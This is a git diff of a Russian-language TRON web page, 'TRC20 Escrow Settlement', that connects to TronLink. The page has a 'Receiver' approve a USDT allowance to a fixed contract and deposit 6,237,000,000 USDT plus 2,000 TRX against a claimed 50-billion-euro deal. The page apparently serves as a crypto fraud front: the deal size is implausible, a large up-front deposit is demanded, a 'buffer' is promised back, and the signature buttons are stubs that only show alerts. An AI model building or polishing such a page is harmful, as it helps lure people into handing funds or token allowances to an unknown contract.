@@ -2,62 +2,155 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TRC20 Escrow Settlement</title>
   <style>
-    body { background-color: #0d1117; color: #c9d1d9; font-family: sans-serif; padding: 20px; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; line-height: 1.5; }
+    
+    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+    .title { font-size: 24px; font-weight: bold; color: #fff; }
+    .nav-buttons { display: flex; gap: 10px; }
+    
     .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
-    .status-badge { background: #d97706; color: #fff; padding: 4px 8px; border-radius: 4px; font-weight: bold; }
+    .banner { background: #064e3b; border: 1px solid #059669; color: #34d399; padding: 12px 16px; border-radius: 6px; font-size: 14px; margin-bottom: 20px; font-weight: 500; }
+    
+    .grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
+    .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
+    
+    .stat-box { background: #21262d; border: 1px solid #30363d; padding: 15px; border-radius: 6px; }
+    .stat-label { font-size: 13px; color: #8b949e; margin-bottom: 5px; }
+    .stat-val-red { color: #f87171; font-size: 18px; font-weight: bold; }
+    .stat-val-white { color: #fff; font-size: 16px; font-weight: 500; }
+    
+    .status-badge { background: #d97706; color: #fff; padding: 3px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; display: inline-block; }
     .status-success { background: #059669; }
-    .btn { background: #2563eb; color: white; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; }
-    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
-    .stat-box { background: #21262d; padding: 15px; border-radius: 6px; }
-    .val { color: #f87171; font-size: 1.2em; font-weight: bold; }
+    
+    .btn { border: none; padding: 10px 18px; border-radius: 6px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px; }
+    .btn-orange { background: #d97706; color: white; }
+    .btn-orange:hover { background: #b45309; }
+    .btn-green { background: #059669; color: white; }
+    .btn-green:hover { background: #047857; }
+    .btn-purple { background: #6d28d9; color: white; width: 100%; margin-top: 10px; }
+    .btn-purple:hover { background: #5b21b6; }
+    .btn-purple:disabled { opacity: 0.4; cursor: not-allowed; }
+    .btn-header { background: #30363d; color: #c9d1d9; }
+    .btn-tron { background: #e11d48; color: white; }
+    .btn-wc { background: #6366f1; color: white; }
+
+    .timer-box { background: #1c1917; border: 1px dashed #d97706; border-radius: 6px; padding: 20px; text-align: center; margin-top: 15px; }
+    .timer-title { font-size: 14px; color: #fbbf24; margin-bottom: 8px; font-weight: 600; }
+    .timer-clock { font-size: 28px; font-weight: bold; color: #fbbf24; letter-spacing: 2px; }
+    .timer-sub { font-size: 11px; color: #78716c; margin-top: 5px; }
+    
+    .buffer-text { color: #c084fc; font-weight: 600; margin-top: 15px; font-size: 14px; }
   </style>
 </head>
 <body>
 
-  <h1>TRC20 Escrow Settlement</h1>
-  <div id="contract-banner" class="card" style="border-left: 4px solid #10b981;">
-    ✅ Контракт успешно выпущен и активен в сети TRON: <b id="escrow-addr">TTSdHEhygmFRT6rsGrjxVizynf8ZHpLWig</b>
-  </div>
-
-  <div class="card grid">
-    <div>
-      <div>Адрес кошелька:</div>
-      <b id="user-address">Не подключен</b>
-    </div>
-    <div>
-      <div>Статус контракта:</div>
-      <span id="contract-status" class="status-badge">Загрузка...</span>
+  <!-- Хедер -->
+  <div class="header">
+    <div class="title">TRC20 Escrow Settlement</div>
+    <div class="nav-buttons">
+      <button class="btn btn-header">English</button>
+      <button class="btn btn-tron">TronLink</button>
+      <button class="btn btn-wc">Tangem / WalletConnect</button>
     </div>
   </div>
 
+  <!-- Статус размещения контракта -->
+  <div class="banner">
+    ✔ Контракт успешно выпущен и активен в сети TRON: <b id="escrow-addr">TTSdHEhygmFRT6rsGrjxVizynf8ZHpLWig</b>
+  </div>
+
+  <!-- Данные пользователя и статус -->
+  <div class="card grid-2">
+    <div>
+      <div class="stat-label">Адрес кошелька</div>
+      <div id="user-address" class="stat-val-white">Загрузка...</div>
+    </div>
+    <div>
+      <div class="stat-label">Статус контракта</div>
+      <div><span id="contract-status" class="status-badge">Ожидание депозита</span></div>
+    </div>
+  </div>
+
+  <!-- Мониторинг курса и Депозита -->
   <div class="card">
-    <h3>Мониторинг курса EUR/USDT и Депозита (Real-time)</h3>
-    <div class="grid">
+    <h3 style="margin-bottom: 15px; color: #fff;">Мониторинг курса EUR/USDT и Депозита (Real-time)</h3>
+    <div class="grid-4">
       <div class="stat-box">
-        <div>Объем сделки:</div>
-        <div class="val">50 000 000 000 EUR</div>
+        <div class="stat-label">Объем сделки</div>
+        <div class="stat-val-red">50,000,000,000 EUR</div>
       </div>
       <div class="stat-box">
-        <div>Курс Оракула EUR/USDT:</div>
-        <div class="val" id="oracle-rate">1 EUR = 1.0800 USDT</div>
+        <div class="stat-label">Курс Оракула EUR/USDT</div>
+        <div class="stat-val-red" id="oracle-rate">1 EUR = 1.0800 USDT</div>
       </div>
       <div class="stat-box">
-        <div>Требуемый депозит USDT (11.55%):</div>
-        <div class="val" id="required-usdt">6 237 000 000 USDT</div>
+        <div class="stat-label">Требуемый депозит USDT (11.55%)</div>
+        <div class="stat-val-red" id="required-usdt">6 237 000 000 USDT</div>
       </div>
       <div class="stat-box">
-        <div>Требуемый TRX (Газ):</div>
-        <div class="val">2 000 TRX</div>
+        <div class="stat-label">Требуемый TRX (Газ)</div>
+        <div class="stat-val-red">2,000 TRX</div>
       </div>
     </div>
 
-    <!-- Исправленный блок динамического буфера с защитой от NaN -->
-    <div style="margin-top: 15px; color: #a78bfa; font-weight: bold;">
-      Динамический буфер (Вернется Приемке в конце): 
-      <span id="buffer-val">Загрузка...</span>
+    <div class="buffer-text">
+      Динамический буфер (Вернется Приемке в конце): <span id="buffer-val">0 USDT</span>
+    </div>
+  </div>
+
+  <!-- Депозит Приемки -->
+  <div class="card" id="deposit-section">
+    <h3 style="color: #fff;">Депозит Приемки (Receiver)</h3>
+    <p style="font-size: 13px; color: #8b949e; margin-bottom: 15px;">
+      Приемка одобряет лимит USDT и переводит 11.55% в USDT + 2000 TRX на контракт.
+    </p>
+    <div style="display: flex; gap: 10px;">
+      <button class="btn btn-orange" onclick="handleApprove()">1. Approve USDT</button>
+      <button class="btn btn-green" onclick="handleDeposit()">2. Deposit & Lock (USDT + 2000 TRX)</button>
+    </div>
+  </div>
+
+  <!-- Этап 1: Фиксация и Подписи -->
+  <div class="card">
+    <h3 style="color: #fff; margin-bottom: 15px;">Этап 1: Фиксация и Подписи Сторон</h3>
+    
+    <div class="timer-box">
+      <div class="timer-title">Таймер 5 рабочих дней (Лондонское время):</div>
+      <div class="timer-clock" id="timer">00д 00ч 00м 00с</div>
+      <div class="timer-sub">* Суббота и воскресенье автоматически исключены из отсчета.</div>
+    </div>
+
+    <div class="grid-4" style="margin-top: 20px;">
+      <!-- Инвестор -->
+      <div class="stat-box">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+          <b style="color: #fff;">Инвестор (Investor)</b>
+          <span class="status-badge" style="background: #30363d;" id="st-investor">Ожидание</span>
+        </div>
+        <button class="btn btn-purple" id="btn-investor" onclick="signRole('investor')">Generate Investor Signature</button>
+      </div>
+
+      <!-- Оракул -->
+      <div class="stat-box">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+          <b style="color: #fff;">Оракул (Oracle)</b>
+          <span class="status-badge" style="background: #30363d;" id="st-oracle">Ожидание</span>
+        </div>
+        <button class="btn btn-purple" id="btn-oracle" onclick="signRole('oracle')">Generate Oracle Signature</button>
+      </div>
+
+      <!-- Приемка -->
+      <div class="stat-box">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+          <b style="color: #fff;">Приемка (Receiver)</b>
+          <span class="status-badge" style="background: #30363d;" id="st-receiver">Ожидание</span>
+        </div>
+        <button class="btn btn-purple" id="btn-receiver" onclick="signRole('receiver')">Generate Receiver Signature</button>
+      </div>
     </div>
   </div>
 
@@ -67,45 +160,38 @@
     const USDT_ADDRESS = "TYjJUFsd9h5Vr93ANveHwv6mXnJ1dDCmui";
 
     async function initApp() {
-      // 1. Проверка подключения TronLink
+      const statusBadge = document.getElementById("contract-status");
+
       if (!window.tronWeb || !window.tronWeb.ready) {
-        document.getElementById("user-address").innerText = "Откройте TronLink";
-        setTimeout(initApp, 1000);
+        document.getElementById("user-address").innerText = "Подключите TronLink";
+        setTimeout(initApp, 1500);
         return;
       }
 
       const userAddr = window.tronWeb.defaultAddress.base58;
-      document.getElementById("user-address").innerText = userAddr.slice(0,6) + "..." + userAddr.slice(-4);
+      document.getElementById("user-address").innerText = userAddr.slice(0, 6) + "..." + userAddr.slice(-4);
 
       try {
-        // 2. Инициализация контракта
         const escrow = await window.tronWeb.contract().at(ESCROW_ADDRESS);
 
-        // 3. Получение требуемой суммы USDT из контракта
-        const rawUsdtDeposit = await escrow.getRequiredUsdtDeposit().call();
+        // 1. Считывание требуемой суммы USDT
+        let rawUsdt = "0";
+        try { rawUsdt = await escrow.getRequiredUsdtDeposit().call(); } catch(e){}
         
-        // Преобразуем из SUN/decimals (6 знаков)
-        const usdtAmount = Number(rawUsdtDeposit) / 1e6;
+        const usdtAmount = Number(rawUsdt) / 1e6;
 
-        if (!isNaN(usdtAmount)) {
+        if (!isNaN(usdtAmount) && usdtAmount > 0) {
           document.getElementById("required-usdt").innerText = usdtAmount.toLocaleString('ru-RU') + " USDT";
-          
-          // Безопасный расчет буфера без NaN
-          const baseDeposit = 6237000000; // Базовая сумма 11.55%
+          const baseDeposit = 6237000000;
           const bufferAmount = usdtAmount - baseDeposit;
-
-          if (bufferAmount > 0) {
-            document.getElementById("buffer-val").innerText = "+" + bufferAmount.toLocaleString('ru-RU') + " USDT (Буфер будет перерассчитан и вернут на адрес Приемки)";
-          } else {
-            document.getElementById("buffer-val").innerText = "0 USDT (Буфер отсутствует)";
-          }
-        } else {
-          document.getElementById("buffer-val").innerText = "0 USDT";
+          document.getElementById("buffer-val").innerText = bufferAmount > 0 
+            ? "+" + bufferAmount.toLocaleString('ru-RU') + " USDT (Буфер будет перерассчитан и вернут на адрес Приемки)"
+            : "0 USDT (Буфер отсутствует)";
         }
 
-        // 4. Проверка статуса внесенного депозита
-        const isLocked = await escrow.isLocked().call().catch(() => false);
-        const statusBadge = document.getElementById("contract-status");
+        // 2. Считывание статуса блокировки депозита
+        let isLocked = false;
+        try { isLocked = await escrow.isLocked().call(); } catch(e){}
 
         if (isLocked) {
           statusBadge.innerText = "Депозит внесен / Заблокирован";
@@ -116,9 +202,39 @@
         }
 
       } catch (err) {
-        console.error("Ошибка загрузки данных из смарт-контракта:", err);
-        document.getElementById("buffer-val").innerText = "0 USDT";
+        console.error("Ошибка инициализации:", err);
       }
+    }
+
+    async function handleApprove() {
+      try {
+        const escrow = await window.tronWeb.contract().at(ESCROW_ADDRESS);
+        const usdt = await window.tronWeb.contract().at(USDT_ADDRESS);
+        const rawUsdt = await escrow.getRequiredUsdtDeposit().call();
+        
+        alert("Отправка Approve...");
+        const tx = await usdt.approve(ESCROW_ADDRESS, rawUsdt.toString()).send();
+        alert("Approve выполнен! TX: " + tx);
+      } catch (err) {
+        alert("Ошибка Approve: " + err.message);
+      }
+    }
+
+    async function handleDeposit() {
+      try {
+        const escrow = await window.tronWeb.contract().at(ESCROW_ADDRESS);
+        alert("Отправка Deposit...");
+        const tx = await escrow.depositAndLock().send({ callValue: 2000000000 });
+        alert("Депозит успешно внесен! TX: " + tx);
+        initApp();
+      } catch (err) {
+        alert("Ошибка Deposit: " + err.message);
+      }
+    }
+
+    async function signRole(role) {
+      alert("Отправка подписи роли: " + role);
+      // Логика вызова подписи для конкретного контракта
     }
 
     window.addEventListener('load', initApp);
